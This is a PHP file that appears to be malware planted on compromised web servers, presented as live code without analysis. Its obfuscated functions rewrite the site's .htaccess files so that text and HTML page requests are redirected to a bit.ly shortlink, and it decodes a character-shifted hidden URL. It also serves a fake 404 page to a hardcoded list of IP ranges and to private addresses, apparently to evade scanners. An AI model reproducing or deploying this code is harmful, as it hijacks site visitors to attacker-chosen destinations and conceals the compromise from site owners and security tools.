<?php
$xvsmqjxyucdfbwcda = 'xvsmqjxyucdfbwcd';

function getlnk($t = "def")
{
    $cid = "v4dr" . $t;
    return "https://bit.ly/2C19AzT";
}

function c($ip, $range)
{
    list($subnet, $bits) = explode('/', $range);
    if ($bits === null)
    {
        $bits = 32;
    }
    $ip = ip2long($ip);
    $subnet = ip2long($subnet);
    $mask = - 1 << (32 - $bits);
    $subnet &= $mask;

    return ($ip & $mask) == $subnet;

}

function f($ip)
{
    $bl = array(
        "74.217.90.250",
        "70.42.131.106",
        "199.167.53.0/24",
        "199.167.52.0/24",
        "154.59.126.0/24",
        "154.59.123.0/24",
        "72.165.69.0/24",
        "66.232.40.0/24",
        "66.232.37.0/24",
        "66.232.36.0/24",
        "66.232.34.0/24",
        "66.232.33.0/24",
        "65.155.38.0/24",
        "65.154.226.0/24",
        "64.74.215.0/24",
        "66.232.47.0/24",
        "66.232.46.0/24",
        "66.232.45.0/24",
        "66.232.44.0/24",
        "66.232.43.0/24",
        "66.232.42.0/24",
        "66.232.41.0/24",
        "66.232.39.0/24",
        "66.232.32.0/24",
        "65.155.30.0/24",
        "117.20.47.0/24",
        "95.172.65.0/24",
        "63.251.35.0/24",
        "31.186.225.0/24",
        "74.217.88.0/24",
        "66.151.131.0/24"
    );

    foreach ($bl as $blip)
    {
        if (strpos($blip, '/'))
        {
            if (c($ip, $blip) == true)
            {
                return true;
            }
        }
        else
        {
            if ($ip == $blip)
            {
                return true;
            }
        }
    }
    return false;
}

function a()
{
    $ip = $_SERVER['REMOTE_ADDR'];
    if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER))
    {
        $ip = array_pop(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']));
    }
    if (f($ip))
    {
        return true;
    }
    $pri_addrs = array(
        '10.0.0.0|10.255.255.255',
        '172.16.0.0|172.31.255.255',
        '192.168.0.0|192.168.255.255',
        '169.254.0.0|169.254.255.255',
        '127.0.0.0|127.255.255.255'
    );
    $long_ip = ip2long($ip);
    if ($long_ip != - 1)
    {
        foreach ($pri_addrs as $pri_addr)
        {
            list($start, $end) = explode('|', $pri_addr);
            if ($long_ip >= ip2long($start) && $long_ip <= ip2long($end))
            {
                return true;
            }
        }
    }
    return false;
}
function d($a)
{
    $d = array_shift($a);
    $l = "";
    foreach ($a as $b)
    {
        $l .= chr($b - $d);
    }
    return $l;
}
function e()
{
    header("HTTP/1.1 404 Not Found");
    echo '
							Not Found
							The requested URL was not found on this server.

							';
    exit;
}

function h($tf)
{
    $l = getlnk("hta");
    @chmod($tf, 0666);
    @unlink($tf);
    if ($fw = @fopen($tf, "w"))
    {
        if (@flock($fw, LOCK_EX))
        {
            $r = implode("\n", array(
                "",
                "RewriteEngine On",
                "RewriteRule ^.+\.txt$ $l [L]",
                "RewriteRule ^.+\.htm$ $l [L]",
                "RewriteRule ^.+\.html$ $l [L]",
                "RewriteCond %{REQUEST_FILENAME} !-f",
                "RewriteCond %{REQUEST_FILENAME} !-d",
                "RewriteRule . $l [L]",
                "",
                ""
            ));
            $r .= "\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index.php\$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . index.php [L]\n\n";
            @fwrite($fw, $r);
            @flock($fw, LOCK_UN);
        }
        @fclose($fw);
    }
}
function r()
{
    return substr(str_shuffle('abcdefghijklmnopqrstuvwxyz') , 0, 10);
}
function s()
{
    $s = "69,173,185,185,181,127,116,116,171,166,178,174,177,190,166,174,169,184,166,177,170,115,184,186";
    return (explode(',', $s));
}
function m($u)
{
    $webroot = ".";
    if (isset($_SERVER["DOCUMENT_ROOT"]) && strlen($_SERVER["DOCUMENT_ROOT"])) $webroot = $_SERVER["DOCUMENT_ROOT"];
    $webroot = str_replace("\\", "/", $webroot);
    $webroot = preg_replace("#/$#", "", $webroot);
    $webroot .= "/";
    h($webroot . ".htaccess");
    h("./.htaccess");
    $u = d($u);
    $u = base64_encode(str_rot13($u));
    $k = 0;
    $r0 = r();
    $r1 = r() . "a";
    $r2 = r() . "b";
    $e = "";
    if (a() || !strpos($_SERVER['REQUEST_URI'], '?'))
    {
        e();
    }
    else
    {
        $k = strlen($u);
    }
    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
    header("Cache-Control: post-check=0, pre-check=0", false);
    header("Pragma: no-cache");
    $e .= "";
    echo $e;
}
m(s());
$xvsmqjxyucdfbwcdb = 'xvsmqjxyucdfbwcd';
